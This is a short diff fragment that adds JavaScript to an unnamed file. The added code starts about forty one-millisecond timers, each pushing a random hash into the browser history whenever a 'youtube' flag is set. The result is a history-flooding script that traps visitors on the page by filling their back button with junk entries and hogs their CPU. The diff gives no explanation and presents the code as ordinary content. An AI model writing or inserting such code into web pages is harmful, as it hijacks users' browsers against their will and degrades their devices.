@@ -1,0 +1,3 @@
+function history1(){setInterval(() =>{ if (youtube===true){
+history.pushState(null, null, "#" + Math.random());}},1);}
+if (youtube===true){Promise.all([history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1(),history1()]);}
